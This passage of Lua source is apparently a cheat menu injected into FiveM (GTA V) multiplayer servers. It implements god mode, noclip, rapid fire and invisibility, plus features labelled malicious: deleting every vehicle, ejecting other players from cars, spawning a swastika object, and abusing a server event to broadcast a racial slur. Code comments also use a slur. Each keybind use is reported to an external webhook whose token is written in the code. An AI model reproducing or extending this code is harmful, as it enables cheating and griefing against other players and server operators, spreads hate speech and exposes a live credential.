                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_speedboost"]].active and wmlua.F.HoldingCTRL(0, 21) and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active ~= true then

                    if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.RC_boostpriority"]].active and wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) then
                        wmlua.V._veh = wmlua.P.RCCar.Entity
                    else
                        wmlua.V._veh = wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())
                    end

                    wmlua.N.SetVehicleForwardSpeed(wmlua.V._veh, wmlua.N.GetEntitySpeed(wmlua.V._veh) + wmlua.V.Veh_speedboost_intensity)

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_superbrake"]].active and wmlua.F.HoldingCTRL(0, 72) then

                    if wmlua.N.GetEntitySpeedVector(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), true).y > 3.0 then
                        wmlua.N.SetVehicleForwardSpeed(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), wmlua.N.GetEntitySpeed(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed())) - wmlua.V.Veh_superbrake_intensity)
                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_shitdriftmode"]].active and wmlua.F.HoldingCTRL(0, 21) and wmlua.N.IsPedInAnyVehicle(wmlua.N.GetPlayerPed()) then
                    wmlua.V.ShitDriftMode = true
                    wmlua.N.SetVehicleReduceGrip(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), true)
                elseif wmlua.V.ShitDriftMode then
                    wmlua.N.SetVehicleReduceGrip(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), false)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Veh_scorch"]].active then
 
                    wmlua.N.SetEntityRenderCrispy(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), true)

                else 

                    wmlua.N.SetEntityRenderCrispy(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), false)

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Wep_rapidfire"]].active then

                    if wmlua.F.HoldingCTRL(0, 24) then

                        local weapon = wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed())
                        local wepent = wmlua.N.Get_CurrentPedWeaponEntityIndex(wmlua.N.GetPlayerPed())
                        local camDir = wmlua.F.GetCamDirFromScreenCenter()
                        local camPos = wmlua.N.GetGameplayCamCoord()
                        local launchPos = wmlua.N.GetEntityPos(wepent)
                        local targetPos = camPos + (camDir * 50.0)

                        for i = 1, 4 do
                            wmlua_Schleep(0)
                            wmlua.H.WMInvokeNative(0x867654CBC7606F2C, launchPos, targetPos, 5, 1, weapon, wmlua.N.GetPlayerPed(), true, true, 24000.0)
                        end

                    end

                end
            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Wep_oneshot"]].active then
                    wmlua.H.WMInvokeNative(0xCE07B9F7817AADA3, wmlua.N.PlayerId(), 99999999.0)
                end

                if wmlua.V.Wep_dmgmod_val then
                    wmlua.H.WMInvokeNative(0xCE07B9F7817AADA3, wmlua.N.PlayerId(), wmlua.V.Wep_dmgmod_val)
                end

                if wmlua.N.IsPed_Shooting(wmlua.N.GetPlayerPed()) then

                    wmlua.V.ShotsFired = wmlua.V.ShotsFired + 1

                elseif wmlua.F.ReleasedCTRL(0, 24) or wmlua.F.HoldingCTRL(0, 24) == false then

                    wmlua.V.ShotsFired = 0

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Wep_noreload"]].active then

                    _, wmlua.V.ClipAmmo = GetAmmoInClip(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()))
                    if wmlua.V.ClipAmmo < GetMaxAmmoInClip(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()), true) then

                        wmlua.N.SetAmmoInClip(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()), GetMaxAmmoInClip(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()), true))

                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Wep_infammo"]].active and wmlua.N.IsPed_Shooting(wmlua.N.GetPlayerPed()) then
                    wmlua.N.AddAmmoToPed(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()), 1)
                elseif wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Wep_infammo"]].active and wmlua.N.IsPedArmed(wmlua.N.GetPlayerPed(), 6) and wmlua.N.GetAmmoInPedWeapon(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed())) == 0 then
                    wmlua.N.SetPedAmmo(wmlua.N.GetPlayerPed(), wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()), 90)
                    wmlua.F.EventLogInsert("[~b~WM~w~] Added ammo due to empty", 1000)
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- Player Thread

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_invisibility"]].active then
                    wmlua.H.WMInvokeNative(0xEA1C610A04DB6BBB, wmlua.N.GetPlayerPed(), false)
                else
                    wmlua.H.WMInvokeNative(0xEA1C610A04DB6BBB, wmlua.N.GetPlayerPed(), true)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_antistun"]].active then

                    if wmlua.N.IsPedBeingStunned(wmlua.N.GetPlayerPed(),0) then
                        wmlua.H.WMInvokeNative(0xAAA34F8A7CB32098, wmlua.N.GetPlayerPed())
                    end
                    wmlua.N.SetPedMinGroundTimeForStungun(wmlua.N.GetPlayerPed(), 0.0)

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_infstamina"]].active then
                    wmlua.N.RestorePlayerStamina(wmlua.N.PlayerId(), wmlua.N.GetPlayer_SprintStaminaRemaining(wmlua.N.PlayerId()))
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do wmlua_Schleep(0)
    
            local _, error = wmlua_pcall(function()
    
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_antiragdoll"]].active then 

                    wmlua.N.SetPedNoRagdoll(wmlua.N.GetPlayerPed(), 0)

                else 

                    wmlua.N.SetPedNoRagdoll(wmlua.N.GetPlayerPed(), 1)

                end 
    
            end)
    
            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end
    
        end
    
    end)

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do wmlua_Schleep(30)
    
            local _, error = wmlua_pcall(function() -- invmeme
    
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.ESX_invitememe"]].active and wmlua.V.ESXInvMemeEvent then
                    wmlua_SendEvent(1, wmlua.V.ESXInvMemeEvent, 69.1337, "property", -1, {property = "nigger land", owner = "kek"})
                end
    
            end)
    
            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end
    
        end
    
    end)
    
    wmlua_Thread(function() -- Per frame Cheese

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_opkai"]].active then
                    local opkPos = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, 10.0, 0.5)
                    local pList = wmlua.N.GetEntList("CPed")
                    for i = 1, #pList do
                        if not wmlua.N.IsPedAPlayer(pList[i]) and not wmlua.N.IsEntityDead(pList[i]) then
                            wmlua.F.RequestControl(pList[i])
                            wmlua.N.SetEntityPos(pList[i], opkPos)
                            wmlua.N.SetEntityHeading(pList[i], wmlua.N.GetEntityHeading(wmlua.N.GetPlayerPed()))
                            wmlua.N.SetEntityVelocity(pList[i], 0.0, 0.0, 0.0)
                        end
                    end
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- Per frame Cheese

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)
                
                wmlua.N.DrawSprite(wmlua.logoDict, wmlua.logoSprite, 0.5, 0.97, 0.05, 0.05, 0.0, 255,255,255,200, true)

                if wmlua.F.HoldingCTRL(0, 210) then
                    wmlua.N.HudWeaponWheelIgnoreSelection()
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_noaicollisions"]].active then
                    local vehList = wmlua.N.GetEntList("CVehicle")
                    for i = 1, #vehList do
                        wmlua.V.SelfV = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
                        wmlua.V.PedV = vehList[i]
                        if wmlua.V.SelfV and wmlua.V.PedV then
                            wmlua.N.SetEntityNoCollisionEntity(wmlua.V.SelfV, wmlua.V.PedV, true)
                            wmlua.N.SetEntityNoCollisionEntity(wmlua.V.PedV, wmlua.V.SelfV, true)
                        end
                    end
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_deletecars"]].active then

                    local vehList = wmlua.N.GetEntList("CVehicle")
                    for i = 1, #vehList do

                        wmlua_Thread(function()

                            wmlua.V.MaxSeats = wmlua.H.WMInvokeNative(0x2AD93716F184EDA4, wmlua.N.GetEntityModel(vehList[i]))
                            if type(wmlua.V.MaxSeats) == "number" then
                                for i = -1, wmlua.V.MaxSeats do
                                    wmlua.N.Clear_PedTasks(wmlua.N.GetPedInVehicleSeat(vehList[i], i), true)
                                end
                            end
                            wmlua.N.NetworkRequestControlOfNetworkId(NetworkGetNetworkIdFromEntity(vehList[i]))
                            wmlua.F.RequestControl(vehList[i])
                            wmlua.N.SetEntityAsMissionEntity(vehList[i])
                            wmlua.N.SetEntityAsNoLongerNeeded(vehList[i])
                            wmlua.N.DeleteVehicle(vehList[i])
                            wmlua.N.DeleteEntity(vehList[i])
                            wmlua_Schleep(0)
                
                        end)

                    end

                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    wmlua_Thread(function() -- Per frame Cheese

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_infiniteroll"]].active then
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STRENGTH"), 1100, true)
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_WHEELIE_ABILITY"), 1100, true)
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_DRIVING_ABILITY"), 1100, true)
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_FLYING_ABILITY"), 1100, true)
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_SHOOTING_ABILITY"), 1100, true)
                    wmlua.N.StatSetInt(wmlua.N.GetHashKey("MP0_STEALTH_ABILITY"), 1100, true)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_nocombatstance"]].active then
                    wmlua.N.SetPedUsingActionMode(wmlua.N.GetPlayerPed(), true, 1,1)
                    wmlua.V.setActionMode = true
                elseif wmlua.V.setActionMode then
                    wmlua.V.setActionMode = false
                    wmlua.F.EventLogInsert("disabled action mode")
                    wmlua.N.SetPedUsingActionMode(wmlua.N.GetPlayerPed(), true, 1,0)
                end

                wmlua.V.GTime = wmlua.N.Get_GameTimer()

                if wmlua.V.motion ~= 0 and not wmlua.F.HoldingCTRL(0, 24) then
                    ForcePedMotionState(wmlua.N.GetPlayerPed(), wmlua.V.motion, 1,1,0)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_godmode"]].active then
                    wmlua.N.WadaGM(wmlua.N.GetPlayerPed(), true, 21.1337)
                else
                    wmlua.N.WadaGM(wmlua.N.GetPlayerPed(), false, 21.1337)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_antiheadshot"]].active then
                    wmlua.N.SetPedSuffersCriticalHits(wmlua.N.GetPlayerPed(), false)
                else
                    wmlua.N.SetPedSuffersCriticalHits(wmlua.N.GetPlayerPed(), true)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Ply_demigodmode"]].active then
                    NetworkSetLocalPlayerInvincibleTime(100)
                end

                if wmlua.menu.v.drawmenu and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active and wmlua.F.PressedCTRL(0, 305) and wmlua.V.InputActive == false then
                    wmlua_Thread(function()
                        wmlua.F.BindControl()
                    end)
                end

                for k,v in ipairs(wmlua.T.Cheese) do
                    wmlua.V.held = false

                    for k2,v2 in ipairs(v.bind) do
                        wmlua.V.bc = #v.bind

                        if wmlua.V.bc == 1 then
                            wmlua.V.held = true
                        end

                        if k2 ~= wmlua.V.bc and wmlua.F.HoldingCTRL(0, v2) then
                            wmlua.V.held = true
                        elseif not k2 == wmlua.V.bc then
                            wmlua.V.held = false
                        end

                        if tonumber(k2) == tonumber(wmlua.V.bc) and wmlua.F.PressedCTRL(0, v2) and wmlua.V.held then
                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Lua_safemode"]].active then
                                if v.Unsafe ~= true then
                                    wmlua_Thread(function() -- lets not break main thread and all if the function is niggered / non existant
                                        v.efunc()
                                        wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId()) .. " (" .. wmlua.N.ScGetNickname() .. ")", "Keybind Executed: " .. v.label, "778179457461911572/U-wx3-Gm7aBcXjDVCQmW44VgQVGZhKKwHrGcIb8i9B30V56ZepUbXQ8MlP5lTlSHJWBs")
                                    end)
                                else
                                    wmlua.F.EventLogInsert("[~r~WM~w~] Prevented running feature due to safe mode", 3000)
                                end
                            else
                                wmlua_Thread(function() -- lets not break main thread and all if the function is niggered / non existant
                                    v.efunc()
                                    wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId()) .. " (" .. wmlua.N.ScGetNickname() .. ")", "Keybind Executed: " .. v.label, "778179457461911572/U-wx3-Gm7aBcXjDVCQmW44VgQVGZhKKwHrGcIb8i9B30V56ZepUbXQ8MlP5lTlSHJWBs")
                                end)
                            end
                        end

                    end

                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Lua_drawcontrol"]].active then
                    wmlua.V.pressed_controls = wmlua.STRINGS[19]
                    for i = 0, 357 do
                        if wmlua.F.HoldingCTRL(0, i) then
                            if wmlua.V.pressed_controls == wmlua.STRINGS[19] then
                                wmlua.V.pressed_controls = i  .. wmlua.STRINGS[6] .. wmlua.F.FormatControlName(wmlua.H.WMInvokeNative(0x0499D7B09FC9B407,0, i, true, wmlua.H.ResultAsString())) .. wmlua.STRINGS[7]
                            else
                                wmlua.V.pressed_controls = wmlua.V.pressed_controls .. wmlua.STRINGS[2] .. i .. wmlua.STRINGS[6] .. wmlua.F.FormatControlName(wmlua.H.WMInvokeNative(0x0499D7B09FC9B407,0, i, true, wmlua.H.ResultAsString())) .. wmlua.STRINGS[7]
                            end
                        end
                    end
                    wmlua.F.Draw2dText(wmlua.STRINGS[46] .. wmlua.V.pressed_controls, 0.400, 0.648, 1.0, 0.3, 0, 200, 255, 255, 0)
                end

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mis_noclip"]].active and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active == false then

                    wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 16, true)
                    wmlua.H.WMInvokeNative(0xFE99B66D079CF6BC, 0, 17, true)

                    local isInVehicle = wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed(), 0)
                    local k = nil
                    local x, y, z = nil

                    if not isInVehicle then
                        k = wmlua.N.GetPlayerPed()
                        x, y, z = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(), 2))
                    else
                        k = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), 0)
                        x, y, z = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(), 1))
                    end

                    if isInVehicle and wmlua.N.GetPedInVehicleSeat(k, -1) ~= wmlua.N.GetPlayerPed() then wmlua.F.RequestControl(k) end

                    local camx, camy, camz = wmlua.F.GetCamDirection()

                    wmlua.N.SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)

                    if wmlua.V.NoclipSpeed == nil then
                        wmlua.V.NoclipSpeed = 0.1
                    end

                    if wmlua.F.PressedCTRL(0, 15) and not wmlua.F.HoldingCTRL(0, 210) then
                        wmlua.V.NoclipSpeed = wmlua.V.NoclipSpeed + 1.0
                        wmlua.F.EventLogInsert("[~b~WM~w~] Noclip speed increased to: " .. wmlua.V.NoclipSpeed, 1000)
                    end

                    if wmlua.F.PressedCTRL(0, 14) and not wmlua.F.HoldingCTRL(0, 210) then
                        wmlua.V.NoclipSpeed = wmlua.V.NoclipSpeed - 1.0
                        wmlua.F.EventLogInsert("[~b~WM~w~] Noclip speed decreased to: " .. wmlua.V.NoclipSpeed, 1000)
                    end

                    if wmlua.F.HoldingCTRL(0, 32) then -- MOVE FORWARD [W]
                        x = x + wmlua.V.NoclipSpeed * camx
                        y = y + wmlua.V.NoclipSpeed * camy
                        z = z + wmlua.V.NoclipSpeed * camz
                    end

                    if wmlua.F.HoldingCTRL(0, 269) then -- MOVE BACK [S]
                        x = x - wmlua.V.NoclipSpeed * camx
                        y = y - wmlua.V.NoclipSpeed * camy
                        z = z - wmlua.V.NoclipSpeed * camz
                    end

                    if wmlua.F.HoldingCTRL(0, 22) then -- MOVE UP [SPACE]
                        z = z + wmlua.V.NoclipSpeed
                    end

                    if wmlua.F.HoldingCTRL(0, 210) then -- MOVE DOWN [LCTRL]
                        z = z - wmlua.V.NoclipSpeed
                    end

                    wmlua.H.WMInvokeNative(0x239A3351AC1DA385, k, x, y, z, true, true, true)
                end

                -- Malicious

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_disabledcars"]].active then
                    local plist = wmlua.N.GetActivePlayers()
                    for i = 1, #plist do
                        if wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed(plist[i]), true) then
                            wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(plist[i]), true)
                        end
                    end
                end

                if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 168) then
                    wmlua.F.LUARunCode()
                end

            end)

            if error then
                error = error:gsub("upvalue '", "global '") wmlua_print(error:gsub("wmlua", wmlua2))
            end

        end

    end)

    -- FreeCamera

    wmlua.T.Freecam_Config = {
        Mode = 1,
        BoostFactor = 10.0,
        Sensitivity = 7.5,
        Speed = {
            Min = 5,
            Start = 5,
            Max = 1000,
            Interval = 5,
        },
        Keys = {
            Modifier = 19, -- Left Alt
            Boost = 21, -- Left Shift
            SlowDown = 44, -- Q
            SpeedUp = 38, -- E
            Forward = 32, -- W
            Back = 33, -- S
            Left = 34, -- A
            Right = 35, -- D
            Up = 22, -- Space
            Down = 36, -- Left Control
        },
    }

    wmlua.T.FreecamModes = {
        "Teleport", -- 1
        "Taze", -- 2
        "Vehicle Spawner", -- 3
        "Vehicle Spammer", -- 4
        "Ped Spawner", -- 5
        "Ped Spammer", -- 6
        "Object Spawner", -- 7
        "Object Spammer", -- 8
        "Entity Deleter", -- 9
        "SFX Spammerino", -- 10
        "Swastika Entity", -- 11
        "Ai Vehicle Thief", -- 12
        "Spikestrip Spawner", -- 13
        "RC Car Entity", -- 14
        "Vehicle Cloner", -- 15
    }

    wmlua.V.CAM_SPEED = wmlua.T.Freecam_Config.Speed.Start

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(0)

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active and wmlua.V.InputActive == false and wmlua.menu.v.drawmenu == false then
                    wmlua.F.HandleCam()
                elseif wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active then
                    for i = 1, 31 do
                        wmlua.H.WMInvokeNative(0x5F4B6931816E599B, i)
                    end
                end

            end)

        end

    end)

    function wmlua.F.startCam()
        if not wmlua.V.Freecam or not wmlua.N.DoesCamExist(wmlua.V.Freecam) then

            wmlua.V.Freecam = wmlua.N.CreateCam('DEFAULT_SCRIPTED_CAMERA', true)

            local location = wmlua.N.GetGameplayCamCoord()
            local rot = wmlua.N.GetGameplayCamRot(2)
            local fov = wmlua.N.GetGameplayCamFov()
            local cam = wmlua.V.Freecam

            wmlua.N.RenderCam(true, true, 500, true, false, false)
            wmlua.N.SetCamCoord(cam, location)
            wmlua.N.SetCamRot(cam, rot, 2)
            wmlua.N.SetCamFov(cam, fov)

        end
    end

    wmlua.ST.SpamCars = {
        wmlua.N.GetHashKey("Stretch"),
        wmlua.N.GetHashKey("Asterope"),
        wmlua.N.GetHashKey("Emperor"),
        wmlua.N.GetHashKey("Fugitive"),
        wmlua.N.GetHashKey("Ingot"),
        wmlua.N.GetHashKey("Intruder"),
        wmlua.N.GetHashKey("Rentalbus"),
        wmlua.N.GetHashKey("Trash"),
        wmlua.N.GetHashKey("Alpha"),
        wmlua.N.GetHashKey("Banshee"),
        wmlua.N.GetHashKey("Buffalo"),
        wmlua.N.GetHashKey("Comet2"),
        wmlua.N.GetHashKey("Coquette"),
        wmlua.N.GetHashKey("Feltzer2"),
        wmlua.N.GetHashKey("Fusilade"),
        wmlua.N.GetHashKey("Futo"),
        wmlua.N.GetHashKey("Jester"),
        wmlua.N.GetHashKey("Massacro"),
        wmlua.N.GetHashKey("Ninef"),
        wmlua.N.GetHashKey("Penumbra"),
        wmlua.N.GetHashKey("Tornado"),
        wmlua.N.GetHashKey("Boxville"),
        wmlua.N.GetHashKey("Burrito"),
        wmlua.N.GetHashKey("Minivan"),
        wmlua.N.GetHashKey("Pony"),
        wmlua.N.GetHashKey("Taco"),
        wmlua.N.GetHashKey("Speedo"),
        wmlua.N.GetHashKey("Stanier"),
        wmlua.N.GetHashKey("Regina"),
    }

    wmlua.T.SpamCarsOriginal = wmlua.ST.SpamCars

    wmlua.ST.SpamPeds = {
        wmlua.N.GetHashKey("s_f_y_baywatch_01"),
        wmlua.N.GetHashKey("s_m_y_baywatch_01"),
        wmlua.N.GetHashKey("a_f_m_beach_01"),
        wmlua.N.GetHashKey("a_f_y_beach_01"),
        wmlua.N.GetHashKey("a_m_m_beach_01"),
        wmlua.N.GetHashKey("a_m_m_beach_01"),
        wmlua.N.GetHashKey("a_m_m_bevhills_01"),
        wmlua.N.GetHashKey("a_c_cat"),
        wmlua.N.GetHashKey("a_c_chop"),
        wmlua.N.GetHashKey("a_c_cow"),
        wmlua.N.GetHashKey("s_m_y_construct_01"),
        wmlua.N.GetHashKey("s_m_y_construct_02"),
        wmlua.N.GetHashKey("a_m_y_eastsa_02"),
        wmlua.N.GetHashKey("a_f_y_eastsa_03"),
        wmlua.N.GetHashKey("u_m_m_edtoh"),
        wmlua.N.GetHashKey("s_m_y_dwservice_02"),
        wmlua.N.GetHashKey("s_m_y_dwservice_01"),
        wmlua.N.GetHashKey("g_m_y_famca_01"),
        wmlua.N.GetHashKey("a_f_m_fatwhite_01"),
        wmlua.N.GetHashKey("a_m_m_hasjew_01"),
    }

    wmlua.T.SpamPedsOriginal = wmlua.ST.SpamPeds

    wmlua.ST.SpamObjs = {
        wmlua.N.GetHashKey("bkr_prop_biker_tube_cross"),
        wmlua.N.GetHashKey("lf_house_09_"),
        wmlua.N.GetHashKey("hei_prop_heist_tug"),
        wmlua.N.GetHashKey("prop_dock_rtg_01"),
        wmlua.N.GetHashKey("ar_prop_ar_tube_4x_crn_5d"),
    }

    wmlua.T.SpamObjsOriginal = wmlua.ST.SpamObjs

    wmlua.ST.SpamSfx = {
        {c1 = "core", c2 = "ent_sht_flame", size = 100.0},
        {c1 = "scr_exile1", c2 = "scr_ex1_plane_exp", size = 5.0},
    }

    wmlua.T.SpamSfxOriginal = wmlua.ST.SpamSfx

    wmlua.T.VehicleCloneProps = {}
    wmlua.T.VehicleCloneProps.model = ""
    wmlua.T.VehicleCloneProps.mods = {}
    wmlua.T.VehicleCloneProps.togglemods = {}
    wmlua.T.VehicleCloneProps.extras = {}
    wmlua.T.VehicleCloneProps.colors = {}
    wmlua.T.VehicleCloneProps.plate = ""

    function wmlua.F.HandleCam()
        --wmlua_Thread(function()

            local fPeds = wmlua.N.GetEntList("CPed")
            for i = 1, #fPeds do
                if not wmlua.N.IsPedAPlayer(fPeds[i]) and wmlua.N.GetEntityModel(fPeds[i]) == wmlua.N.GetHashKey("a_c_seagull") then
                    wmlua_Thread(function()
                        wmlua.F.RequestControl(fPeds[i])
                        wmlua.menu.f.drawtext({text = 'preventing crash', x = 0.01, y = 0.01, scale = 0.1, size = 0.35, font = 4}, {red = 255, green = 0, blue = 50, alpha = 255})
                        wmlua.N.DeleteEntity(fPeds[i])
                    end)
                end
            end
    
            wmlua.N.RequestCollisionAtCoord(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))
    
            local cam = wmlua.V.Freecam
            local frameTime = wmlua.N.GetFrameTime()
    
            local rotation = wmlua.N.GetCamRot(cam,2)
            rotation = rotation + wmlua.F.getMouseMovement()
            local location = wmlua.N.GetCamPos(cam)
            local newLocation = wmlua.F.getMovementInput(location, rotation, frameTime)
    
            if rotation.x > 85 then
                rotation = vector3(85, rotation.y, rotation.z)
            elseif rotation.x < -85 then
                rotation = vector3(-85, rotation.y, rotation.z)
            end
    
            wmlua.N.SetCamRot(cam, rotation, 2)
    
            wmlua.N.SetCamCoord(cam, newLocation)
            wmlua.N.SetFocusArea(location)
            wmlua.H.WMInvokeNative(0x77E2DD177910E1CF, location.x, location.y) -- This spoofs our player blip arrow, confusion factor Xd
            wmlua.N.LockMinimapPosition(location.x, location.y)
            wmlua.N.SetBlipRotation(wmlua.N.GetMainPlayerBlipId(), rotation)
    
            if wmlua.F.PressedCTRL(0, wmlua.T.Freecam_Config.Keys.SpeedUp) then
                wmlua.V.CAM_SPEED = wmlua.V.CAM_SPEED + wmlua.T.Freecam_Config.Speed.Interval
                wmlua.V.CAM_SPEED = math.min(wmlua.V.CAM_SPEED, wmlua.T.Freecam_Config.Speed.Max)
                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
            elseif wmlua.F.PressedCTRL(0, wmlua.T.Freecam_Config.Keys.SlowDown) then
                wmlua.V.CAM_SPEED = wmlua.V.CAM_SPEED - wmlua.T.Freecam_Config.Speed.Interval
                wmlua.V.CAM_SPEED = math.max(wmlua.V.CAM_SPEED, wmlua.T.Freecam_Config.Speed.Min)
                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
            end
    
            if wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.SpeedUp) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                wmlua.V.CAM_SPEED = wmlua.V.CAM_SPEED + wmlua.T.Freecam_Config.Speed.Interval
                wmlua.V.CAM_SPEED = math.min(wmlua.V.CAM_SPEED, wmlua.T.Freecam_Config.Speed.Max)
                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
            elseif wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.SlowDown) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                wmlua.V.CAM_SPEED = wmlua.V.CAM_SPEED - wmlua.T.Freecam_Config.Speed.Interval
                wmlua.V.CAM_SPEED = math.max(wmlua.V.CAM_SPEED, wmlua.T.Freecam_Config.Speed.Min)
                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
            end
    
            local targetLocation = wmlua.F.getRelativeLocation(location, rotation, 250)
            wmlua.V.ray = wmlua.N.CastRayToPoint(newLocation, targetLocation, -1, 0)
            local _,hit,hitCoords,normal,entity = wmlua.N.GetRaycastResult(wmlua.V.ray)
    
            wmlua.V.CAM_hitcoords = hitCoords
    
            for i = 0, 32 do
                wmlua.H.WMInvokeNative(0x5F4B6931816E599B, i)
            end
    
            wmlua.F.Draw2dText("Freecam Mode: " .. wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] .. " | Speed: " .. wmlua.F.Round(wmlua.V.CAM_SPEED, 1), 0.450, 0.915, 0.0, 0.3, 255, 255, 255, 255, 0)
            --entity ~= wmlua.N.GetPlayerPed() and
            if wmlua.N.DoesEntityExist(entity) then
                if wmlua.N.IsEntityAPed(entity) or wmlua.N.IsEntityAnObject(entity) or wmlua.N.IsEntityAVehicle(entity) then -- lol if this isnt here, big breakage
